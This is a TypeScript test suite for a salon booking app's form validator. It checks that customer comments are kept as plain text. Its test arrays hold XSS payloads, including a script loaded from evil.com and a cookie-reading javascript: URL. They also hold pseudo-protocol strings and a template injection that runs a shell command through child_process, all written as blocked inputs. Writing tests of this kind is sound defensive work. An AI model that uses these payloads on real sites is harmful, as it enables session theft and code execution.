/**
 * Test Suite: Validación Estricta de Texto Plano vs Código Ejecutable
 * Verifica que los comentarios e información suministrada en formularios
 * se procesen ÚNICAMENTE como texto plano y NUNCA como código ejecutable.
 * Ejecución: npx tsx src/tests/plainTextSecurity.test.ts
 */

import assert from 'assert';
import { validateOnlyPlainText, sanitizeToPlainText, escapeHtml } from '../utils/security';

console.log('====================================================');
console.log('🛡️ PRUEBAS DE SEGURIDAD: PROCESAMIENTO EXCLUSIVO DE TEXTO PLANO');
console.log('====================================================');

// Test 1: Texto plano legítimo (Comentarios cotidianos de clientas)
{
  const legitimateComments = [
    'Quiero esmaltado semipermanente en tono nude y diseño minimalista.',
    'Tengo uñas frágiles, por favor retiro con torno suave y base fortalecedora.',
    'Llegaré 10 minutos antes. Por favor manicurista Carolina.',
    'Cita para madre e hija a las 3:30 pm.'
  ];

  for (const comment of legitimateComments) {
    const val = validateOnlyPlainText(comment, 'Comentarios');
    assert.strictEqual(val.isValid, true, `El texto plano legítimo debe ser válido: "${comment}"`);
    const sanitized = sanitizeToPlainText(comment);
    assert.strictEqual(sanitized, comment, 'El texto plano no debe alterarse al sanitizar');
  }
  console.log('1. [Texto Plano Legítimo] Comentarios y notas estándar');
  console.log('   ✅ Aceptados correctamente sin alteración.');
}

// Test 2: Bloqueo de inyección de scripts HTML (<script>, <iframe>, <svg>, <img>)
{
  const maliciousPayloads = [
    '<script>alert("XSS")</script>',
    '<SCRIPT SRC="http://evil.com/xss.js"></SCRIPT>',
    '<iframe src="javascript:alert(1)"></iframe>',
    '<img src="x" onerror="alert(\'XSS\')">',
    '<svg onload="alert(document.domain)">',
    '<b>Diseño</b> <script>document.location="http://attacker.com"</script>'
  ];

  for (const payload of maliciousPayloads) {
    const val = validateOnlyPlainText(payload, 'Observaciones');
    assert.strictEqual(val.isValid, false, `Debe bloquear payload malicioso: "${payload}"`);
    assert.ok(val.reason?.includes('solo admite texto plano'), 'Debe indicar que solo admite texto plano');

    // Al forzar sanitización, no deben quedar etiquetas ni scripts
    const sanitized = sanitizeToPlainText(payload);
    assert.ok(!sanitized.includes('<script>'), 'No debe contener <script>');
    assert.ok(!sanitized.includes('onerror='), 'No debe contener onerror=');
    assert.ok(!sanitized.includes('javascript:'), 'No debe contener javascript:');
    assert.ok(!sanitized.includes('<'), 'No debe contener corchetes angulares');
  }
  console.log('2. [Bloqueo de Scripts HTML] Etiquetas <script>, <iframe>, <img>, <svg>');
  console.log('   ✅ Rechazadas y bloqueadas con advertencia explicativa.');
}

// Test 3: Bloqueo de pseudo-protocolos ejecutables (javascript:, vbscript:, data:)
{
  const pseudoProtocols = [
    'javascript:alert(document.cookie)',
    'JAVASCRIPT:void(0)',
    'vbscript:msgbox("hello")',
    'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='
  ];

  for (const protocol of pseudoProtocols) {
    const val = validateOnlyPlainText(protocol, 'Enlace o Nota');
    assert.strictEqual(val.isValid, false, `Debe bloquear pseudo-protocolo: "${protocol}"`);
    const sanitized = sanitizeToPlainText(protocol);
    assert.ok(!sanitized.toLowerCase().includes('javascript:'), 'Debe remover javascript:');
  }
  console.log('3. [Bloqueo de Pseudo-Protocolos] javascript:, vbscript:, data:');
  console.log('   ✅ Neutralizados y prevenidos.');
}

// Test 4: Bloqueo de inyecciones de plantillas y ejecución dinámica (${...}, {{...}}, eval())
{
  const dynamicExecution = [
    '${process.mainModule.require("child_process").execSync("id")}',
    '{{7*7}}',
    'eval("alert(1)")',
    'new Function("return 42")()',
    'window.location = "http://evil.com"'
  ];

  for (const dynamic of dynamicExecution) {
    const val = validateOnlyPlainText(dynamic, 'Comentarios');
    assert.strictEqual(val.isValid, false, `Debe bloquear ejecución dinámica: "${dynamic}"`);
  }
  console.log('4. [Bloqueo de Expresiones Dinámicas] Plantillas ${...}, {{...}}, eval()');
  console.log('   ✅ Rechazadas como código ejecutable.');
}

// Test 5: Sanitización forzada a texto plano puro
{
  const mixedInput = '<p>Deseo color rojo</p> <script>alert("hack")</script> y manicura rusa.';
  const sanitized = sanitizeToPlainText(mixedInput);
  assert.strictEqual(sanitized, 'Deseo color rojo  y manicura rusa.', 'Debe depurar todas las etiquetas y ejecutables');

  const htmlEntities = escapeHtml('Nota con "comillas" & <etiquetas>');
  assert.strictEqual(htmlEntities, 'Nota con &quot;comillas&quot; &amp; &lt;etiquetas&gt;');
  console.log('5. [Sanitización Defensiva] Conversión estricta a texto plano');
  console.log('   ✅ Ningún fragmento ejecutable sobrevive al pipeline.');
}

// Test 6: Longitud máxima de seguridad para prevenir Buffer Overflow o ataques DoS
{
  const longPayload = 'A'.repeat(501);
  const val = validateOnlyPlainText(longPayload, 'Comentarios', 500);
  assert.strictEqual(val.isValid, false, 'Debe rechazar texto que supere el límite de longitud');
  assert.ok(val.reason?.includes('supera el límite permitido'));
  console.log('6. [Límite de Longitud] Prevención de desbordamiento en comentarios');
  console.log('   ✅ Límites estrictos aplicados.');
}

console.log('====================================================');
console.log('✨ TODAS LAS PRUEBAS DE TEXTO PLANO PASARON EXITOSAMENTE (6/6).');
console.log('====================================================');
